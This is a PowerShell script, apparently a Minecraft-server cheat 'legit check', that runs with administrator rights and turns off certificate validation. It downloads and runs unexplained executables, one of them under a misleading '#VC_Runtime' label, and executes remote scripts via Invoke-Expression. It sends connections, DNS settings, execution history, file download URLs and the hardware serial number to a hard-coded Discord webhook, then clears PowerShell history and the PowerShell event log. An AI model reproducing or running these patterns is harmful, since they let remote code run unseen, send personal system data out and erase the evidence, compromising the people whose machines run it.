Clear-Host
$startTime = Get-Date

Add-Type -AssemblyName System.IO.Compression.FileSystem
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

function Write-Logo {
    $color = "Magenta"

    Write-Host ""
    Write-Host ""
    Write-Host "       :::        ::::::::::       ::::::::       :::::::::::   :::::::::::        ::::::::       :::    :::       ::::::::::       ::::::::       :::    :::" -ForegroundColo $color -NoNewline
    Write-Host ""
    Write-Host "     :+:        :+:             :+:    :+:          :+:           :+:           :+:    :+:      :+:    :+:       :+:             :+:    :+:      :+:   :+:" -ForegroundColo $color -NoNewline
    Write-Host ""
    Write-Host "    +:+        +:+             +:+                 +:+           +:+           +:+             +:+    +:+       +:+             +:+             +:+  +:+:" -ForegroundColo $color -NoNewline
    Write-Host ""
    Write-Host "   +#+        +#++:++#        :#:                 +#+           +#+           +#+             +#++:++#++       +#++:++#        +#+             +#++:++" -ForegroundColo $color -NoNewline 
    Write-Host ""
    Write-Host "  +#+        +#+             +#+   +#+#          +#+           +#+           +#+             +#+    +#+       +#+             +#+             +#+  +#+" -ForegroundColo $color -NoNewline 
    Write-Host ""
    Write-Host " #+#        #+#             #+#    #+#          #+#           #+#           #+#    #+#      #+#    #+#       #+#             #+#    #+#      #+#   #+#" -ForegroundColo $color -NoNewline 
    Write-Host ""
    Write-Host "########## ##########       ########       ###########       ###            ########       ###    ###       ##########       ########       ###    ###" -ForegroundColo $color -NoNewline
    Write-Host ""
    Write-Host ""
    Write-Host ""
    Write-Host ""
}

function Send-Webhook-Data() {
    param($Payload)

    $webhookUrl = "https://discord.com/api/webhooks/1430163604883243069/o8pNeSj-qVF5ROqFNqoac6kK3BsVgC7RvLU2KvczeNZfS03108GQM5kapCV4OE2YukRm"

    $body = $Payload | ConvertTo-Json -Depth 5

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json; charset=utf-8"
}


#VC_Runtime
Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/0.exe" -OutFile "1.exe"
Start-Process -FilePath "1.exe" -Wait
if (Test-Path "1.exe") { Remove-Item -Path "1.exe" -Force }
#END




Write-Logo

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Права администратора не обнаружены" -ForegroundColor Yellow
    exit 1
}



Write-Host "Stage 1"




#Get java args
$scriptBlock = {
    Get-CimInstance Win32_Process | Where-Object {$_.Name -like '*java*'} | ForEach-Object {
        $splitText = [string]($_.CommandLine) -split '-Djava.library.path='

        if($splitText.Count -eq 2) {
            Write-Host $splitText[0]
            Write-Host "-Djava.library.path=" -ForegroundColor Yellow -NoNewline
            Write-Host $splitText[1] -NoNewline
        }
    }
}
Start-Process powershell -ArgumentList "-NoExit", "-Command", "& {$scriptBlock}"
#END





#Check deleted files
$scriptBlock = {
    Invoke-WebRequest 'https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/2.exe' -OutFile '3.exe'

    $driveLetters = @(Get-Volume | Where-Object {$_.DriveLetter} | ForEach-Object {$_.DriveLetter})
    $commandLine = @()

    foreach($i in $driveLetters) {
        $commandLine += ./3.exe read $i -f '*.exe'
    }

    $needNext = 0
    $lastTime = ''

    if($commandLine) {
        foreach($i in $commandLine -split '\n') {
            if($needNext -eq 1) {
                Write-Host 'Deleted .exe in ' $lastTime ' : ' ($i -split ' : ')[1].trim() -ForegroundColor Yellow
                $needNext = 0
            }

            if($i.Contains('FILE_DELETE')) { 
                $needNext = 1
            }
            if($i.Contains('Timestamp')) {
                $lastTime = ($i -split ' : ')[1].trim()
            }
        }
    }




    $commandLine = @()

    foreach($i in $driveLetters) {
        $commandLine += ./3.exe read $i -f '*.jar'
    }

    $needNext = 0
    $lastTime = ''

    if($commandLine) {
        foreach($i in $commandLine -split '\n') {
            if($needNext -eq 1) {
                Write-Host 'Deleted .jar in ' $lastTime ' : ' ($i -split ' : ')[1].trim() -ForegroundColor Red
                $needNext = 0
            }

            if($i.Contains('FILE_DELETE')) { 
                $needNext = 1
            }
            if($i.Contains('Timestamp')) {
                $lastTime = ($i -split ' : ')[1].trim()
            }
        }
    }
    if (Test-Path '3.exe') { Remove-Item -Path '3.exe' -Force }
}
#END





Start-Process powershell -ArgumentList "-NoExit", "-Command", "& {$scriptBlock}"

Start-Process powershell -ArgumentList "-Command", "Invoke-Expression (Invoke-RestMethod 'https://github.com/Ryodzaki/scripts/raw/refs/heads/main/services.ps1')"

Start-Process powershell -ArgumentList '-NoExit', '-Command', 'Invoke-Expression (Invoke-RestMethod https://github.com/dontfuckmybrain/myscripts/raw/refs/heads/main/ServiceCheck.ps1)'



#$obsProcess = Get-Process -Name "obs64", "obs32", "obs", "ayugram", "telegram", "nvcontainer", "gamebar", "steam", "discord", "lively", "chrome", "opera", "msedge"
#if ($obsProcess) { $obsProcess | Stop-Process -Force }

$embeds = @()
$data = Get-Date -Format "dd.MM.yyyy HH:mm"



Write-Host "Stage 2"




#Connection info
$connections = @(netstat -an | Where-Object { $_ -match "TCP.*2556.*ESTABLISHED" } | ForEach-Object { ($_ -split '\s+')[3] | Select-Object -First 1 })
if ($connections) { $embeds += @{ 
        title = "Connections" 
        description = ($connections -join "`n")
        color = 16776960
    }
} else {
    $embeds += @{ 
        title = "Connections" 
        description = "None"
        color = 16711680
    }
}
#END






#Get DNS Data
$dnsData = @(ipconfig /all | Select-String "DNS" | ForEach-Object { if ($_.ToString() -match "^([^:]+?)\s*:\s*(.*)$" -and $matches[2].Trim()) { $matches[2].Trim() } } | Where-Object { $_ })
if ($dnsData) { $embeds += @{ 
        title = "DNS Info" 
        description = ($dnsData -join "`n")
        color = 16776960
    }
} else {
    $embeds += @{ 
        title = "DNS Info" 
        description = "None"
        color = 16711680
    }
}
#END







#Check USN
$usn_deletes = @(try { Get-WinEvent -FilterXml "<QueryList><Query Id='0' Path='Microsoft-Windows-Ntfs/Operational'><Select Path='Microsoft-Windows-Ntfs/Operational'>*[System[EventID=501]] and *[EventData[Data[@Name='ProcessName'] and (Data='fsutil.exe')]]</Select></Query></QueryList>" -ErrorAction Stop | ForEach-Object { $_.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss") } } catch { @() })
if ($usn_deletes) { $embeds += @{ 
        title = "USN Deleted" 
        description = ($usn_deletes -join "`n")
        color = 16711680
    }
}
#END






#Check .dlls
$javawDlls = @(Get-Process javaw -ErrorAction SilentlyContinue | ForEach-Object { $_.Modules } | Where-Object { $_.ModuleName -like "*.dll" -and -not $_.FileVersionInfo.FileDescription -and $_.FileName -notmatch "\\(natives|Temp)\\" } | Where-Object { (Get-AuthenticodeSignature $_.FileName).Status -ne 'Valid' } | Select-Object -ExpandProperty FileName)
if ($javawDlls) { $embeds += @{ 
        title = "Suspicious dlls detected" 
        description = ($javawDlls -join "`n")
        color = 16711680
    }
}
#END



Write-Host "Stage 3"



#Search baritoen folders
$baritoneDirs = @()

Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/2.exe" -OutFile "1.exe"

$driveLetters = @(Get-Volume | Where-Object {$_.DriveLetter} | ForEach-Object {$_.DriveLetter})
$commandLine = @()

foreach($i in $driveLetters) {
    $commandLine += ./1.exe search $i -f cache --dir-only 
}

if($commandLine) {
    foreach($i in $commandLine -split "\n") {
        if($i.Contains("Path") -and $i.Contains("funtime")) { 
            $baritoneDirs += ($i -split " : ")[1].trim()
        }
    }
}

    #Zone.ID
$zoneidDlls = @()
$dooms = @()
$zoneidExes = @()


$commandLine = @()


foreach($i in $driveLetters) {
    $commandLine += ./1.exe search $i -f "*.exe" --file-only
}

if($commandLine) {
    foreach($i in $commandLine -split "\n") {
        if($i.Contains("Path")) { 
            $cleanPath = ($i -split " : ")[1].trim()
            if(Test-Path -LiteralPath $cleanPath) {
                $content = (Get-Content -LiteralPath $cleanPath -Stream Zone.Identifier -ErrorAction SilentlyContinue) -split "`n"
              
                if($content) { 
                    foreach($i in $content) {
                        if($i.Contains("HostUrl=")) {
                            $res = $cleanPath + "`n" + $i.Replace("HostUrl=", "").Trim()
                            $zoneidExes += $res
                        }
                    }
                }
            }
        }
    }
}

$commandLine = @()
Write-Host "Stage 3.1"

foreach($i in $driveLetters) {
    $commandLine += ./1.exe search $i -f "*.jar" --file-only
}

if($commandLine) {
    foreach($i in $commandLine -split "\n") {
        if($i.Contains("Path")) { 
            $cleanPath = ($i -split " : ")[1].trim()
            if(Test-Path -LiteralPath $cleanPath) {
                $content = (Get-Content -LiteralPath $cleanPath -Stream Zone.Identifier -ErrorAction SilentlyContinue) -split "`n"
              
                if($content) { 
                    foreach($i in $content) {
                        if($i.Contains("HostUrl=") -and $i.Contains("doomsdayclient.com")) {
                            $res = $cleanPath + "`n" + $i.Replace("HostUrl=", "").Trim()
                            $dooms += $res
                        }
                    }
                }
            }
        }
    }
}


$commandLine = @()
Write-Host "Stage 3.2"


foreach($i in $driveLetters) {
    $commandLine += ./1.exe search $i -f "*.dll" --file-only
}

if($commandLine) {
    foreach($i in $commandLine -split "\n") {
        if($i.Contains("Path")) { 
            $cleanPath = ($i -split " : ")[1].trim()
            if(Test-Path -LiteralPath $cleanPath) {
                $content = (Get-Content -LiteralPath $cleanPath -Stream Zone.Identifier -ErrorAction SilentlyContinue) -split "`n"
              
                if($content) { 
                    foreach($i in $content) {
                        if($i.Contains("HostUrl=")) {
                            $res = $cleanPath + "`n" + $i.Replace("HostUrl=", "").Trim()
                            $zoneidDlls += $res
                        }
                    }
                }
            }
        }
    }
}

if (Test-Path "1.exe") { Remove-Item -Path "1.exe" -Force }

if($baritoneDirs) { $embeds += @{ 
        title = "Baritone Dirs Detected" 
        description = ($baritoneDirs -join "`n")
        color = 16711680
    }
}
if($zoneidDlls) { $embeds += @{ 
        title = "Zone.ID in .dlls" 
        description = ($zoneidDlls -join "`n")
        color = 16711680
    }
}
if($zoneidExes) { $embeds += @{ 
        title = "Zone.ID in .exes" 
        description = ($zoneidExes -join "`n")
        color = 16711680
    }
}
if($dooms) { $embeds += @{ 
        title = "Doomsday clients" 
        description = ($dooms -join "`n")
        color = 16711680
    }
}
#END







Write-Host "Stage 4"






#InjGen
$injgen = ""

Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/1.exe" -OutFile "1.exe"
Invoke-Expression ".\1.exe > tTttT"

if (Test-Path "tTttT") { 
    foreach($i in Get-Content -Path "tTttT") {
        if($i.Contains("Injection detected in")) {
            $injgen = "Detected"
        }
    }
} 
if (Test-Path "1.exe") { Remove-Item -Path "1.exe" -Force }
if (Test-Path "tTttT") { Remove-Item -Path "tTttT" -Force }


if ($injgen) { $embeds += @{ 
        title = "InjGen detected" 
        color = 16711680
    }
}
#END







#VM Check
$vmBrand = ""
Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/3.exe" -OutFile "1.exe"
$commandLine = ./1.exe | Out-String

foreach ($i in $commandLine -split "`n") {
    if ($i -match "VM brand:") {
        $clean = $i -replace "[`u001B`\x1B]\[[0-9;]*[A-Za-z]", ""
        $clean = $clean -replace "[^ -~]", "" 
        $res = ($clean -split "VM brand:")[1].Trim() 
        if(-not $res.Contains("Unknown")) {
            $vmBrand = $res
        }
    }
}

if (Test-Path "1.exe") { Remove-Item -Path "1.exe" -Force }

if ($vmBrand) { $embeds += @{ 
        title = "VM detected" 
        description = $vmBrand
        color = 16711680
    }
}
#END




#BAM
$bamData = @()
function Get-Signature {
    param ([string[]]$FilePath)

    $Existence = Test-Path -PathType "Leaf" -Path $FilePath
    $Authenticode = (Get-AuthenticodeSignature -FilePath $FilePath -ErrorAction SilentlyContinue).Status

    if ($Existence) {
        if ($Authenticode -eq "Valid") { return "Valid Signature" }
        elseif ($Authenticode -eq "NotSigned") { return "Invalid Signature (NotSigned)" }
        else { return "Invalid Signature" }
    } else {
        return "File Was Not Found"
    }
}


$Users = foreach($ii in ("bam", "bam\State")) {
    Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$($ii)\UserSettings\" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty PSChildName
}




$rpath = @("HKLM:\SYSTEM\CurrentControlSet\Services\bam\","HKLM:\SYSTEM\CurrentControlSet\Services\bam\state\")



$Bam = Foreach ($Sid in $Users) {
    foreach($rp in $rpath) {
        $BamItems = Get-Item -Path "$($rp)UserSettings\$Sid" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property  -ErrorAction SilentlyContinue

        ForEach ($Item in $BamItems) {
            $Key = Get-ItemProperty -Path "$($rp)UserSettings\$Sid" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty $Item -ErrorAction SilentlyContinue

            If($key.length -eq 24) {
                $Hex = [System.BitConverter]::ToString($key[7..0]) -replace "-",""
                $TimeUTC = Get-Date ([DateTime]::FromFileTimeUtc([Convert]::ToInt64($Hex, 16))) -Format "dd.MM.yy HH:mm"

                if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}') {
                    $path = Join-Path -Path "C:" -ChildPath ($item).Remove(1,23)
                    $sig = Get-Signature -FilePath $path
                    $app = Split-path -leaf ($item).TrimStart()
                } else {
                    $path = ""
                    $sig = "N/A"
                    $app = $item
                }

                [PSCustomObject]@{
                    'Time' = $TimeUTC
                    'Signature' = $sig
                    'Path' = $path
                    'SortDate' = [DateTime]::FromFileTimeUtc([Convert]::ToInt64($Hex, 16))
                }
            }
        }
    }
}

$FilteredBam = $Bam | Where-Object {
    $_.Signature -eq "Invalid Signature (NotSigned)" -or
    $_.Signature -eq "File Was Not Found"
} | Sort-Object SortDate -Descending

if ($FilteredBam) {
    foreach($i in $FilteredBam) {
        if($i.Signature.Contains("File Was Not Found")) {
            $bamData += ("⚠️ | " + $i.Time + " | " + $i.Path + " ")
        }
        if($i.Signature.Contains("Invalid Signature")) {
            $bamData += ("❌ | " + $i.Time + " | " + $i.Path + " ")
        }
    }
}

if ($bamData) { $embeds += @{ 
        title = "Bam data" 
        description = ($bamData -join "`n")
        color = 16776960
    }
}


#END



$endTime = Get-Date
$duration = $endTime - $startTime
$comment = ""

$hwidData = Invoke-RestMethod ("https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/database")
foreach($i in $hwidData -split "`n") {
    if($i.Contains((Get-WmiObject -Class Win32_BaseBoard).SerialNumber)) {
        $comment = ($i -split ":::")[1]
    }
}

$payload = @{
content = 
"
# Дата: $data HWID: $((Get-WmiObject -Class Win32_BaseBoard).SerialNumber) 
# Длительность: $($duration.TotalMinutes.ToString("F2")) мин
# Комментарий: $comment
"
}
$payload.embeds = $embeds



Send-Webhook-Data -Payload $payload



$filePath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $filePath) { Clear-Content -Path $filePath -Force }
wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"


Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"

